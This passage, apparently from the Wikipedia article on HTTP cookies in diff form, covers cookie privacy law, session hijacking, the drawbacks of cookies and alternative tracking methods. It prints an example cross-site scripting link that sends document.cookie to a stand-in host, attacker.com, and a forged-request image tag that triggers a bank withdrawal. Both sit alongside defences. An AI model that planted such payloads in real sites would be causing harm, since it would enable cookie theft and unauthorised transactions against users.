+Website operators who do not disclose third-party cookie use to consumers run the risk of harming consumer trust if cookie use is discovered. Having clear disclosure (such as in a privacy policy) tends to eliminate any negative effects of such cookie discovery.<ref>Miyazaki, Anthony D. (2008), "Online Privacy and the Disclosure of Cookie Use: Effects on Consumer Trust and Anticipated Patronage," Journal of Public Policy & Marketing, 23 (Spring), 19–33</ref>
+
+The possibility of building a profile of users is a privacy threat, especially when tracking is done across multiple domains using third-party cookies. For this reason, some countries have legislation about cookies.
+
+The United States government has set strict rules on setting cookies in 2000 after it was disclosed that the White House Office of National Drug Control Policy|drug policy office used cookies to track computer users viewing its online anti-drug advertising. In 2002, privacy activist Daniel Brandt found that the Central Intelligence Agency|CIA had been leaving persistent cookies on computers that had visited its website. When notified it was violating policy, CIA stated that these cookies were not intentionally set and stopped setting them.<ref>cite news |url=http://www.cbsnews.com/stories/2002/03/20/tech/main504131.shtml |work=CBS News |title=CIA Caught Sneaking Cookies |date=2002-03-20 </ref> On December 25, 2005, Brandt discovered that the National Security Agency (NSA) had been leaving two persistent cookies on visitors' computers due to a software upgrade. After being informed, the NSA immediately disabled the cookies.<ref>cite news |url=https://www.nytimes.com/2005/12/29/national/29cookies.html |newspaper=New York Times |title=Spy Agency Removes Illegal Tracking Files |date=2005-12-29 </ref>
+
+=EU cookie directive=
+In 2002, the European Union launched the Directive on Privacy and Electronic Communications, a policy requiring end users' consent for the placement of cookies, and similar technologies for storing and accessing information on users' equipment.<ref name=JISC>cite web|title=EU Cookie Directive, Directive 2009/136/EC|url=http://www.jisclegal.ac.uk/ManageContent/ViewDetail/ID/1347/EU-Cookie-Directive--Directive-2009136EC.aspx|publisher=JISC Legal Information|accessdate=31 October 2012</ref><ref name="ICO reference">cite book|title=Privacy and Electronic Communications Regulations|year=2012|publisher=Information Commissioner's Office|url=http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/~/media/documents/library/Privacy_and_electronic/Practical_application/cookies_guidance_v3.ashx</ref> In particular, Article 5 Paragraph 3 mandates that storing data in a user's computer can only be done if the user is provided information about how this data is used, and the user is given the possibility of denying this storing operation.
+
+Directive 95/46/EC defines "the data subject's consent" as "any freely given specific and informed indication of his wishes by which the data subject signifies his agreement to personal data relating to him being processed."<ref>cite journal|title=Directive 95/46/EC of the European Parliament and of the Council of 24 October 1995 on the protection of individuals with regard to the processing of personal data and on the free movement of such data|date=1995-11-23|pages=0031–0050|url=http://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=CELEX:31995L0046:en:HTML|accessdate=31 October 2012</ref> Consent must involve some form of communication where individuals knowingly indicate their acceptance.<ref name="ICO reference" />
+
+In 2009, the policy was amended by Directive 2009/136/EC, which included a change to Article 5, Paragraph 3. Instead of having an option for users to opt out of cookie storage, the revised Directive requires consent to be obtained for cookie storage.<ref name="ICO reference" />
+
+In June 2012, European Information privacy|data protection authorities adopted an opinion which clarifies that some cookie users might be exempt from the requirement to gain consent:
+* Some cookies can be exempted from informed consent under certain conditions if they are not used for additional purposes. These cookies include cookies used to keep track of a user's input when filling online forms or as a shopping cart.
+* First-party analytics cookies are not likely to create a privacy risk if websites provide clear information about the cookies to users and privacy safeguards.<ref>cite web|title=New EU cookie law (e-Privacy Directive)|url=http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/cookies.aspx|accessdate=31 October 2012|deadurl=yes|archiveurl=https://web.archive.org/web/20110224183417/http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/cookies.aspx|archivedate=24 February 2011|df=</ref>
+
+The industry's response has been largely negative. Robert Bond of the law firm Speechly Bircham describes the effects as "far-reaching and incredibly onerous" for "all UK companies". Simon Davis of Privacy International argues that proper enforcement would "destroy the entire industry".<ref>cite web|title=EU cookie law: stop whining and just get on with it|url=https://www.wired.co.uk/news/archive/2012-05/24/eu-cookie-law-moaning|accessdate=31 October 2012</ref>
+
+The P3P specification offers a possibility for a server to state a privacy policy using an HTTP header, which specifies which kind of information it collects and for which purpose. These policies include (but are not limited to) the use of information gathered using cookies. According to the P3P specification, a browser can accept or reject cookies by comparing the privacy policy with the stored user preferences or ask the user, presenting them the privacy policy as declared by the server. However, the P3P specification was criticized by web developers for its complexity. Some websites do not correctly implement it.  For example, Facebook jokingly used "HONK" as its P3P header for a period.<ref name=nyt-bits>cite web|title=A Loophole Big Enough for a Cookie to Fit Through|url=http://bits.blogs.nytimes.com/2010/09/17/a-loophole-big-enough-for-a-cookie-to-fit-through/|work=Bits|publisher=The New York Times|accessdate=31 January 2013</ref> Only Internet Explorer provides adequate support for the specification.
+
+Third-party cookies can be blocked by most browsers to increase privacy and reduce tracking by advertising and tracking companies without negatively affecting the user's web experience. Many advertising operators have an opt-out option to behavioural advertising, with a generic cookie in the browser stopping behavioural advertising.<ref name=nyt-bits /><ref name="howtoblock">cite news |first=Rob |last=Pegoraro |url=https://www.washingtonpost.com/wp-dyn/content/article/2005/07/16/AR2005071600111.html |title=How to Block Tracking Cookies |page=F07 |date=July 17, 2005 |publisher=Washington Post |accessdate=2009-01-04 </ref>
+<!--
+
+We need some information in here about the use of third party logins within iframes, these effectively create a third party cookie, and some browsers/servers incorrectly report this denial as being that cookies have been disabled, when of course they have not, its just that third party cookies have been disabled In particular this is a problem on the iphone and the ipad (safari in general?), which only allow 3 options "always", "never" and "only sites that I visit" allowing no option for third party cookies in the scenario above
+
+-->
+
+Cookie theft and session hijacking
+Multiple issues|section=yes|
+Original research|section|date=September 2011
+Unreferenced section|date=September 2011
+<!--This seems to refer to just the "lede" of this section, not the subsections themselves.-->
+
+Most websites use cookies as the only identifiers for user sessions, because other methods of identifying web users have limitations and vulnerabilities. If a website uses cookies as session identifiers, attackers can impersonate users' requests by stealing a full set of victims' cookies. From the web server's point of view, a request from an attacker then has the same authentication as the victim's requests; thus the request is performed on behalf of the victim's session.
+
+Listed here are various scenarios of cookie theft and user session hijacking (even without stealing user cookies) that work with websites relying solely on HTTP cookies for user identification.
+
+=Network eavesdropping=
+File:Cookie-sniffing.svg|thumb|A cookie can be stolen by another computer that is allowed reading from the network
+
+Traffic on a network can be intercepted and read by computers on the network other than the sender and receiver (particularly over plaintext|unencrypted open Wi-Fi). This traffic includes cookies sent on ordinary unencrypted HTTP sessions. Where network traffic is not encrypted, attackers can therefore read the communications of other users on the network, including HTTP cookies as well as the entire contents of the conversations, for the purpose of a man-in-the-middle attack.
+
+An attacker could use intercepted cookies to impersonate a user and perform a malicious task, such as transferring money out of the victim's bank account.
+
+This issue can be resolved by securing the communication between the user's computer and the server by employing Transport Layer Security (HTTPS protocol) to encrypt the connection. A server can specify the <code>Secure</code> flag while setting a cookie, which will cause the browser to send the cookie only over an encrypted channel, such as an TLS connection.<ref name="httponlyrfc" />
+
+=Publishing false sub-domain: DNS cache poisoning=
+If an attacker is able to cause a DNS server to cache a fabricated DNS entry (called DNS cache poisoning), then this could allow the attacker to gain access to a user's cookies. For example, an attacker could use DNS cache poisoning to create a fabricated DNS entry of <code>f12345.www.example.com</code> that points to the IP address of the attacker's server. The attacker can then post an image URL from his own server (for example, <code><nowiki>http://f12345.www.example.com/img_4_cookie.jpg</nowiki></code>). Victims reading the attacker's message would download this image from <code>f12345.www.example.com</code>. Since <code>f12345.www.example.com</code> is a sub-domain of <code>www.example.com</code>, victims' browsers would submit all <code>example.com</code>-related cookies to the attacker's server.
+
+If an attacker is able to accomplish this, it is usually the fault of the Internet Service Providers for not properly securing their DNS servers. However, the severity of this attack can be lessened if the target website uses secure cookies. In this case, the attacker would have the extra challenge<ref name="certificatehack">Wired [https://www.wired.com/threatlevel/2011/03/comodo-compromise/ Hack Obtains 9 Bogus Certificates for Prominent Websites]</ref> of obtaining the target website's TLS certificate from a certificate authority, since secure cookies can only be transmitted over an encrypted connection. Without a matching TLS certificate, victims' browsers would display a warning message about the attacker's invalid certificate, which would help deter users from visiting the attacker's fraudulent website and sending the attacker their cookies.
+
+=Cross-site scripting: cookie theft=
+Main|Cross-site scripting
+Cookies can also be stolen using a technique called cross-site scripting. This occurs when an attacker takes advantage of a website that allows its users to post unfiltered HTML and JavaScript content. By posting malicious HTML and JavaScript code, the attacker can cause the victim's web browser to send the victim's cookies to a website the attacker controls.
+
+As an example, an attacker may post a message on <code>www.example.com</code> with the following link:
+
+<syntaxhighlight lang="html5">
+<a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">Click here!</a>
+</syntaxhighlight>
+
+File:Cookie-theft.svg|thumb|Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party.
+
+When another user clicks on this link, the browser executes the piece of code within the <code>onclick</code> attribute, thus replacing the string <code>document.cookie</code> with the list of cookies that are accessible from the current page. As a result, this list of cookies is sent to the <code>attacker.com</code> server. If the attacker's malicious posting is on an HTTPS website <code><nowiki>https://www.example.com</nowiki></code>, secure cookies will also be sent to attacker.com in plain text.
+
+It is the responsibility of the website developers to filter out such malicious code.
+
+Such attacks can be mitigated by using HttpOnly cookies. These cookies will not be accessible by client-side scripting languages like JavaScript, and therefore, the attacker will not be able to gather these cookies.
+
+=Cross-site scripting: proxy request=
+In older versions of many browsers, there were security holes in the implementation of the XMLHttpRequest API. This API allows pages to specify a proxy server that would get the reply, and this proxy server is not subject to the same-origin policy. For example, a victim is reading an attacker's posting on <code>www.example.com</code>, and the attacker's script is executed in the victim's browser. The script generates a request to <code>www.example.com</code> with the proxy server <code>attacker.com</code>. Since the request is for <code>www.example.com</code>, all <code>example.com</code> cookies will be sent along with the request, but routed through the attacker's proxy server. Hence, the attacker would be able to harvest the victim's cookies.
+
+This attack would not work with secure cookies, since they can only be transmitted over HTTPS connections, and the HTTPS protocol dictates end-to-end encryption (i.e. the information is encrypted on the user's browser and decrypted on the destination server). In this case, the proxy server would only see the raw, encrypted bytes of the HTTP request.
+
+=Cross-site request forgery=
+Main|Cross-site request forgery
+For example, Bob might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Bob's bank's website (rather than an image file), e.g.,
+
+ <syntaxhighlight lang="xml"><img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"></syntaxhighlight>
+
+If Bob's bank keeps his authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Bob's browser to load the image will submit the withdrawal form with his cookie, thus authorizing a transaction without Bob's approval.
+
+Drawbacks of cookies
+Besides privacy concerns, cookies also have some technical drawbacks. In particular, they do not always accurately identify users, they can be used for security attacks, and they are often at odds with the Representational State Transfer (Representational State Transfer|REST) software architectural style.<ref>cite news |url=http://roy.gbiv.com/pubs/dissertation/evaluation.htm |title=Fielding Dissertation: CHAPTER 6: Experience and Evaluation |first=Roy |last=Fielding |year=2000 |accessdate=2010-10-14</ref><ref>cite web |first=Stefan |last=Tilkov |url=http://www.infoq.com/articles/rest-anti-patterns |title=REST Anti-Patterns |publisher=InfoQ |date=July 2, 2008 |accessdate=2009-01-04</ref>
+
+=Inaccurate identification=
+If more than one browser is used on a computer, each usually has a separate storage area for cookies. Hence, cookies do not identify a person, but a combination of a user account, a computer, and a web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies.
+
+Likewise, cookies do not differentiate between multiple users who share the same user account, computer, and browser.
+
+=Inconsistent state on client and server=
+The use of cookies may generate an inconsistency between the state of the client and the state as stored in the cookie. If the user acquires a cookie and then clicks the "Back" button of the browser, the state on the browser is generally not the same as before that acquisition. As an example, if the shopping cart of an online shop is built using cookies, the content of the cart may not change when the user goes back in the browser's history: if the user presses a button to add an item in the shopping cart and then clicks on the "Back" button, the item remains in the shopping cart. This might not be the intention of the user, who possibly wanted to undo the addition of the item. This can lead to unreliability, confusion, and bugs. Web developers should therefore be aware of this issue and implement measures to handle such situations.
+
+Alternatives to cookies
+Some of the operations that can be done using cookies can also be done using other mechanisms.
+
+=JSON Web Tokens=
+A JSON Web Token (JWT) is a self-contained packet of information that can be used to store user identity and authenticity information.  This allows them to be used in place of session cookies.  Unlike cookies, which are automatically attached to each HTTP request by the browser, JWTs must be explicitly attached to each HTTP request by the web application.
+
+=HTTP authentication=
+The HTTP protocol includes the basic access authentication and the digest access authentication protocols, which allow access to a web page only when the user has provided the correct username and password. If the server requires such credentials for granting access to a web page, the browser requests them from the user and, once obtained, the browser stores and sends them in every subsequent page request. This information can be used to track the user.
+
+=IP address=
+Some users may be tracked based on the IP address of the computer requesting the page. The server knows the IP address of the computer running the browser (or the Proxy server|proxy, if any is used) and could theoretically link a user's session to this IP address.
+
+However, IP addresses are generally not a reliable way to track a session or identify a user. Many computers designed to be used by a single user, such as office PCs or home PCs, are behind a network address translator (NAT). This means that several PCs will share a public IP address. Furthermore, some systems, such as Tor (anonymity network)|Tor, are designed to retain Internet anonymity, rendering tracking by IP address impractical, impossible, or a security risk.
+
+=URL (query string)=
+A more precise technique is based on embedding information into URLs. The query string part of the Uniform Resource Locator|URL is the part that is typically used for this purpose, but other parts can be used as well. The Java Servlet and PHP session mechanisms both use this method if cookies are not enabled.
+
+This method consists of the web server appending query strings containing a unique session identifier to all the links inside of a web page. When the user follows a link, the browser sends the query string to the server, allowing the server to identify the user and maintain state.
+
+These kinds of query strings are very similar to cookies in that both contain arbitrary pieces of information chosen by the server and both are sent back to the server on every request. However, there are some differences. Since a query string is part of a URL, if that URL is later reused, the same attached piece of information will be sent to the server, which could lead to confusion. For example, if the preferences of a user are encoded in the query string of a URL and the user sends this URL to another user by e-mail, those preferences will be used for that other user as well.
+
+Moreover, if the same user accesses the same page multiple times from different sources, there is no guarantee that the same query string will be used each time. For example, if a user visits a page by coming from a page ''internal to the site'' the first time, and then visits the same page by coming from an ''external search engine'' the second time, the query strings would likely be different. If cookies were used in this situation, the cookies would be the same.
+
+Other drawbacks of query strings are related to security. Storing data that identifies a session in a query string enables session fixation attacks, HTTP referer|referer logging attacks and other Exploit (computer security)|security exploits. Transferring session identifiers as HTTP cookies is more secure.
+
+=Hidden form fields=
+Another form of session tracking is to use form (web)|web forms with hidden fields. This technique is very similar to using URL query strings to hold the information and has many of the same advantages and drawbacks. In fact, if the form is handled with the HTTP GET method, then this technique is similar to using URL query strings, since the GET method adds the form fields to the URL as a query string. But most forms are handled with HTTP POST, which causes the form information, including the hidden fields, to be sent in the HTTP request body, which is neither part of the URL, nor of a cookie.
+
+This approach presents two advantages from the point of view of the tracker. First, having the tracking information placed in the HTTP request body rather than in the URL means it will not be noticed by the average user. Second, the session information is not copied when the user copies the URL (to bookmark the page or send it via email, for example).
+
+="window.name" DOM property=
+All current web browsers can store a fairly large amount of data (2–32&nbsp;MB) via JavaScript using the Document Object Model|DOM property <code>window.name</code>. This data can be used instead of session cookies and is also cross-domain. The technique can be coupled with JSON/JavaScript objects to store complex sets of session variables<ref>cite web |url=http://www.thomasfrank.se/sessionvars.html |title=ThomasFrank.se |publisher=ThomasFrank.se |accessdate=2010-05-22</ref> on the client side.
+
+The downside is that every separate window or Tabbed document interface|tab will initially have an empty <code>window.name</code> property when opened. Furthermore, the property can be used for tracking visitors across different websites, making it of concern for Internet privacy.
+
+In some respects, this can be more secure than cookies due to the fact that its contents are not automatically sent to the server on every request like cookies are, so it is not vulnerable to network cookie sniffing attacks. However, if special measures are not taken to protect the data, it is vulnerable to other attacks because the data is available across different websites opened in the same window or tab.
+
+=Identifier for advertisers=
+Apple uses a tracking technique called "identifier for advertisers" (IDFA). This technique assigns a unique identifier to every user that buys an Apple iOS device (such as an iPhone or iPad). This identifier is then used by Apple's advertising network, iAd, to determine the ads that individuals are viewing and responding to.<ref name="IDFA">cite web|url=https://venturebeat.com/2014/10/06/the-cookie-is-dead-heres-how-facebook-google-and-apple-are-tracking-you-now/|title=The cookie is dead. Here's how Facebook, Google, and Apple are tracking you now, VentureBeat, Mobile, by Richard Byrne Reilly|work=VentureBeat</ref>
+
+=ETag=
+Main|HTTP ETag#Tracking using ETags
+Because ETags are cached by the browser, and returned with subsequent requests for the same resource, a tracking server can simply repeat any ETag received from the browser to ensure an assigned ETag persists indefinitely (in a similar way to persistent cookies). Additional caching headers can also enhance the preservation of ETag data.
+
+ETags can be flushed in some browsers by clearing the browser cache.
+
+=Web storage=
+Main|Web storage
+Some web browsers support persistence mechanisms which allow the page to store the information locally for later use.
+
+The HTML5 standard (which most modern web browsers support to some extent) includes a JavaScript API called Web storage that allows two types of storage: local storage and session storage. Local storage behaves similarly to #Persistent cookie|persistent cookies while session storage behaves similarly to #Session cookie|session cookies, except that session storage is tied to an individual tab/window's lifetime (AKA a page session), not to a whole browser session like session cookies.<ref>cite web|title = Window.sessionStorage, Web APIs ! MDN|url = https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage|website = developer.mozilla.org|accessdate = 2 October 2015</ref>
+
+Internet Explorer supports persistent information <ref>cite web|url=http://msdn.microsoft.com/en-us/library/ms533007%28v=vs.85%29.aspx|title=Introduction to Persistence|publisher=Microsoft|work=microsoft.com</ref> in the browser's history, in the browser's favorites, in an XML store ("user data"), or directly within a web page saved to disk.
+
+Some web browser plugins include persistence mechanisms as well. For example, Adobe Flash has Local shared object and Microsoft Silverlight has Isolated storage.<ref>cite web|url=http://msdn.microsoft.com/en-us/library/bdts8hk0%28v=vs.95%29.aspx| title= Isolated Storage| website=Microsoft.com</ref>
+
+=Browser cache=
+Main|Web cache
+The browser cache can also be used to store information that can be used to track individual users. This technique takes advantage of the fact that the web browser will use resources stored within the cache instead of downloading them from the website when it determines that the cache already has the most up-to-date version of the resource.
+
+For example, a website could serve a JavaScript file with code that sets a unique identifier for the user (for example, <code>var userId = 3243242;</code>). After the user's initial visit, every time the user accesses the page, this file will be loaded from the cache instead of downloaded from the server. Thus, its content will never change.
+
+=Browser fingerprint=
+Main|Device fingerprint
+A browser fingerprint is information collected about a browser's configuration, such as version number, screen resolution, and operating system, for the purpose of identification. Fingerprints can be used to fully or partially identify individual users or devices even when cookies are turned off.
+
+Basic web browser configuration information has long been collected by web analytics services in an effort to accurately measure real human web traffic and discount various forms of click fraud. With the assistance of client-side scripting languages, collection of much more esoteric parameters is possible.<ref>cite web|url=http://gemal.dk/browserspy/ |title=BrowserSpy |publisher=gemal.dk |date= |accessdate=2010-01-28</ref><ref>cite web|url=http://mypage.direct.ca/s/schinke/defaultbehaviors/clientCapsExtra.html |title=IE "default behaviors [sic&#93;" browser information disclosure tests: clientCaps |publisher=Mypage.direct.ca |date= |accessdate=2010-01-28</ref> Assimilation of such information into a single string comprises a device fingerprint. In 2010, Electronic Frontier Foundation|EFF measured at least 18.1 bits of Entropy (information theory)|entropy possible from browser fingerprinting.<ref>cite web|url=https://panopticlick.eff.org/browser-uniqueness.pdf |title=How Unique Is Your Web Browser? |last1=Eckersley |first1=Peter |date=17 May 2010 |website=eff.org |publisher=Electronic Frontier Foundation |accessdate=23 July 2014 |deadurl=yes |archiveurl=https://web.archive.org/web/20141015220910/https://panopticlick.eff.org/browser-uniqueness.pdf |archivedate=15 October 2014 |df= </ref> Canvas fingerprinting, a more recent technique, claims to add another 5.7 bits.
+
+See also
+* Dynamic HTML
+* Enterprise JavaBeans
+* Session (computer science)
+* Secure cookie
+
+References
+Reflist
+<!-- Dead note "rfc2": RFC 2109 and RFC 2965, HTTP State Management Mechanism (Internet Engineering Task Force|IETF) -->
+
+FOLDOC
+
+External links
+Spoken Wikipedia|HTTP cookie.ogg|2016-05-28
+Commons category|HTTP cookies
+* RFC 6265, the current official specification for HTTP cookies
+* [https://developer.mozilla.org/en-US/docs/Web_Development/HTTP_cookies HTTP cookies], Mozilla Developer Network
+* [https://developer.mozilla.org/en-US/docs/DOM/document.cookie Using cookies via ECMAScript], Mozilla Developer Network
+* HowStuffWorks|cookie|How Internet Cookies Work
+* [https://www.epic.org/privacy/internet/cookies/ Cookies] at the Electronic Privacy Information Center (EPIC)
+* [https://support.mozilla.org/en-US/kb/cookies-information-websites-store-on-your-computer Mozilla Knowledge-Base: Cookies]
+* [http://bayou.io/draft/cookie.domain.html Cookie Domain, explain in detail how cookie domains are handled in current major browsers]
+
+Web browsers|fsp
+
+Authority control
+
+Category:Computer access control
+Category:Hypertext Transfer Protocol headers|Cookie
+Category:Internet privacy
+Category:Web security exploits
+Category:Wikipedia articles with ASCII art
